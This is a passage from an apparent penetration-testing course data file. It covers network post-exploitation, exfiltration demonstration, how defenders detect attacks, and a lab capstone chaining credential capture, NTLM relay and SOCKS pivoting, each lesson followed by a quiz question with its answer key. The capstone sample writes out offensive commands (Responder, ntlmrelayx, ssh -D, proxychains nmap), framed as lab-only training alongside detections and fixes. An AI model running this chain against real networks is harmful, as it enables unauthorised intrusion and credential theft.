        hint: 'Does the handshake decrypt traffic, or does it enable offline cracking of the passphrase?',
      },
    },

    {
      id: 'rnet-i-10',
      title: 'Network post-exploitation and exfil',
      read: `Once you have a foothold and can pivot, **post-exploitation** on the network is about consolidating and demonstrating impact — safely, within scope, and always so the client learns their real exposure.

## What post-exploitation covers on a network

- **Situational awareness** — from the foothold, what networks, hosts, and credentials are now reachable? (This feeds more pivoting.)
- **Credential gathering** — the foothold may hold cached credentials, keys, or config files with secrets that unlock further hosts.
- **Lateral movement** — reuse credentials (pass-the-hash, spraying, SSH keys) to reach and control more machines across the segments you can now touch.
- **Reaching the objective** — the engagement usually has a goal (domain admin, access to a specific database, proof of reaching a segmented "crown jewel"). Post-exploitation is the path to it.

## Data exfiltration — demonstrating, not stealing

Part of many engagements is showing that **data could leave the network** — because if a tester can exfiltrate, so can an attacker. But this is done carefully:

- Exfiltrate only **proof-of-concept** amounts or **synthetic/marked** data, never real sensitive data in bulk, unless scope explicitly requires it.
- Note the **channel** used (HTTPS to an external host, DNS tunnelling, cloud storage) — because each channel a defender does not monitor is a finding.
- The point is to test **egress controls and DLP**, not to actually remove the client's data.

## Covert channels (concept)

Attackers hide exfiltration in protocols defenders allow out: **DNS tunnelling** (encoding data in DNS queries, which almost always egress), HTTPS to an innocuous-looking host, ICMP. Demonstrating that one of these leaves the network unmonitored is a strong finding (a skilled-level deep dive).

## The professional frame

Post-exploitation is where the *impact* of the engagement is proven — and where restraint matters most. You show the blast radius and the exfil paths **without causing harm**: minimal, marked data; documented actions; nothing destroyed; sensitive findings handled per scope. That restraint is exactly what separates the authorized tester from the attacker they emulate. In the lab, after a pivot, gather credentials from a foothold and use them to reach a further host, documenting the chain.`,
      sample: {
        lang: 'text',
        caption: 'Post-exploitation: prove impact, exercise restraint',
        code: `FROM A FOOTHOLD:
  1. situational awareness  -> what/who is now reachable?
  2. gather credentials     -> cached creds, keys, config secrets
  3. lateral movement       -> reuse creds to reach more hosts
  4. reach the objective     -> DA / a specific "crown jewel"

EXFIL = DEMONSTRATE, don't steal:
  - proof-of-concept / synthetic / MARKED data only
  - record the CHANNEL (HTTPS, DNS tunnel, cloud) = the finding
  - goal: test egress/DLP, not remove real data`,
        output: `Post-exploitation proves the blast radius and the exfil paths
WITHOUT harm: minimal marked data, documented actions, nothing
destroyed. Restraint is what separates the tester from the attacker.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'When a penetration test includes demonstrating data exfiltration, what is the professional approach?',
        options: [
          'Exfiltrate as much of the client’s real sensitive data as possible to maximise impact',
          'Demonstrate that data could leave — using proof-of-concept, synthetic or marked data and recording the channel used — to test egress controls and DLP, without actually removing the client’s real sensitive data unless scope explicitly requires it',
          'Skip exfiltration entirely, since it is always harmful',
          'Delete the data after copying it to prove access',
        ],
        answer: 1,
        explain:
          'The purpose of demonstrating exfiltration is to prove that data *could* leave the network and to test the client’s egress controls and data-loss prevention — not to actually steal their data. So a professional uses proof-of-concept quantities, synthetic or specially marked data, and carefully records the channel that succeeded (HTTPS, DNS tunnelling, cloud storage), because an unmonitored egress path is itself the finding. Removing real sensitive data in bulk would cause the very harm the engagement exists to prevent, so it is done only if scope explicitly requires it and always with restraint. Never destroy data. This restraint — proving impact without causing harm — is what distinguishes the authorized tester from the attacker.',
        hint: 'The goal is to test egress/DLP and prove a path exists — what kind and quantity of data does that actually require?',
      },
    },

    {
      id: 'rnet-i-11',
      title: 'How these attacks are detected',
      read: `Every attack in this level leaves signals. Understanding what a defender sees makes you a better tester — you can advise on detection, and (for authorized red-team work) you know what is noisy. This is the defender's view, applied.

## What each attack looks like to the blue team

- **Port/vuln scans** — bursts of connection attempts across many ports/hosts; an **IDS/IPS** (Snort, Suricata) has signatures for scan patterns. Slow, distributed scanning is quieter.
- **ARP spoofing** — **duplicate MAC/IP mappings** and ARP anomalies; **dynamic ARP inspection** on switches and monitoring tools (arpwatch) catch it.
- **LLMNR/Responder** — a host suddenly *answering* name queries it shouldn't; the definitive tell is that LLMNR/NBT-NS should be *disabled*, so any use is suspect.
- **NTLM relay** — authentication from an unexpected source, logons that don't match normal patterns; requiring signing prevents it outright.
- **Exploitation** — IDS signatures for known exploit payloads; a service crashing or spawning an unexpected child process (EDR on the host).
- **Pivoting/tunnelling** — unusual internal-to-internal connections, a host talking to segments it never normally reaches, or long-lived tunnels/beaconing on egress.

## The two defensive pillars

- **Network monitoring** — **IDS/IPS** on the wire, **NetFlow**/traffic analysis for anomalies, and network detection & response (NDR). These see the *traffic* your attacks generate.
- **Segmentation** — the structural defence: even a successful foothold is contained if segments are properly firewalled, which is exactly why pivoting (and your demonstration of it) matters.

## Why this makes you better

A tester who understands detection can tell the client not just "you are vulnerable to X" but "and here is how you would (or would not) have seen it." That is far more valuable than a raw finding. It also guides authorized red-team OPSEC: you know scanning is loud, slow-and-distributed is quieter, and requiring signing kills relay regardless of your skill. In the lab, run an attack with an IDS (Suricata) watching and read the alerts it generates — seeing your own attack from the blue side is the lesson.`,
      sample: {
        lang: 'text',
        caption: 'Each attack and the signal it leaves',
        code: `ATTACK          WHAT THE DEFENDER SEES        CATCHES / PREVENTS IT
port/vuln scan  many connections, patterns    IDS/IPS signatures
ARP spoof       duplicate MAC<->IP mappings    dynamic ARP inspection
Responder       a host answering LLMNR/NBT     disable LLMNR/NBT-NS
NTLM relay      auth from unexpected source    require signing (kills it)
exploitation    exploit payloads; odd child    IDS + host EDR
pivot/tunnel    host reaching new segments;    segmentation + NetFlow/
                long-lived tunnels/beacons     NDR anomaly detection`,
        output: `Two pillars: network monitoring (IDS/IPS, NetFlow, NDR) sees the
traffic; segmentation contains the foothold. A tester who knows
detection advises "and here's how you'd have seen it" - far more
valuable than a raw finding.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why does understanding network detection make you a more valuable tester, not just a more evasive one?',
        options: [
          'Because evasion is the only goal of every engagement',
          'Because you can advise the client not only that they are vulnerable but whether and how they would have detected the attack — turning a raw finding into detection guidance — while also knowing which techniques are noisy for authorized red-team OPSEC',
          'Because detection tools are irrelevant to real attacks',
          'Because it lets you disable the client’s monitoring',
        ],
        answer: 1,
        explain:
          'Knowing what each attack looks like from the blue side (scan bursts to IDS/IPS, duplicate MAC/IP mappings for ARP spoofing, unexpected LLMNR answers, out-of-place authentications for relay, unusual cross-segment connections for pivoting) lets you tell the client both that a weakness exists and whether their monitoring would have caught it — detection guidance that is far more valuable than a bare finding. It also informs legitimate red-team OPSEC: you know scanning is loud while slow/distributed is quieter, and that requiring signing defeats relay regardless of attacker skill. The two defensive pillars — network monitoring and segmentation — are exactly what your findings should help strengthen. The goal is a stronger defence, not disabling monitoring.',
        hint: 'What can you tell the client beyond "you are vulnerable" once you understand what they would see?',
      },
    },

    {
      id: 'rnet-i-12',
      title: 'Project: MITM to relay to pivot',
      read: `Your intermediate capstone chains the level's big ideas into one realistic attack path on your lab: capture authentication, relay it for access, then pivot into a segment you could not reach — and write it up with detections and fixes. Lab only.

## The brief

Two segments: a "user" network your attacker VM sits on, and a "server" network it cannot reach directly. Your goal: from nothing on the user network, obtain access, then reach and enumerate the server network — proving the blast radius.

## The chain

1. **Capture** — run Responder on the user segment; catch a Net-NTLMv2 authentication from a fumbled name (or coerce one).
2. **Relay or crack** — either relay the captured authentication with ntlmrelayx to a signing-disabled host and gain access, or crack the hash offline for a credential.
3. **Foothold** — use the access/credential to get a shell or session on a host that straddles both segments.
4. **Pivot** — build a SOCKS tunnel through that foothold (SSH \`-D\`, chisel, or ligolo-ng).
5. **Reach the hidden network** — \`proxychains nmap -sT -Pn\` the server segment you could not previously touch; enumerate what is there.
6. **Document detection & fixes** — for each step, what a defender would see and the control that stops it (disable LLMNR, require signing, segment properly, monitor egress).

## The standard

You pass when your report shows the *complete path* — capture → relay/crack → foothold → pivot → hidden-network enumeration — with proof at each stage, plus, for every step, the detection signal and the concrete fix. Crucially, it must articulate the **blast radius**: one fumbled name on the user network led to enumeration of a segment that was supposed to be isolated. That is the story a client needs to hear. All strictly inside your lab, sensitive data handled per scope.

## Where next

Skilled goes to advanced network attacking: multi-hop pivoting, IDS/IPS evasion, layer-2 attacks (VLAN hopping), advanced wireless (evil twin, enterprise), covert channels and NAC bypass — and a network engagement run end to end. It all builds on the chain you just executed.`,
      sample: {
        lang: 'bash',
        caption: 'The intermediate chain end to end (lab only)',
        code: `# 1 capture
sudo responder -I eth0
# 2 relay to a signing-disabled host (or crack the hash)
sudo ntlmrelayx.py -tf targets.txt -smb2support
# 3-4 foothold -> SOCKS pivot through a dual-homed host
ssh -D 1080 user@10.0.0.50
# 5 reach the previously unreachable server segment
proxychains nmap -sT -Pn 10.0.1.0/24
# 6 write up detection + fixes for every step`,
        output: `Pass = the FULL path (capture -> relay/crack -> foothold ->
pivot -> hidden-net enum) with proof at each stage + per-step
detection and fix, and a clear BLAST-RADIUS story: one fumbled
name -> a supposedly-isolated segment enumerated. Lab only.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Beyond showing each individual technique works, what must the intermediate capstone report articulate to meet the standard?',
        options: [
          'The exact version numbers of every tool used',
          'The blast radius — how the chained path (capture → relay/crack → foothold → pivot) led from nothing on one segment to enumerating a segment that was supposed to be isolated — with per-step detection signals and concrete fixes',
          'A promise never to disclose the techniques to the client',
          'The largest number of hosts compromised regardless of relevance',
        ],
        answer: 1,
        explain:
          'The capstone’s value is the story of the whole chain, not the individual tricks. The report must show how a small initial event (a fumbled name captured by Responder) cascaded — relay or crack for access, a foothold on a dual-homed host, then a pivot — into enumerating a network segment that was supposed to be isolated. That is the blast radius, and it is exactly what a client needs to understand about their real exposure. Alongside it, every step should carry the detection signal a defender would see and the concrete control that stops it (disable LLMNR, require signing, segment properly, monitor egress). Proof at each stage, the blast-radius narrative, and per-step detection/fixes — all within the lab — is the passing bar.',
        hint: 'The point is not the tools or the count — what does chaining the steps together reveal about the client’s real exposure?',
      },
    },
  ],
}

export default level
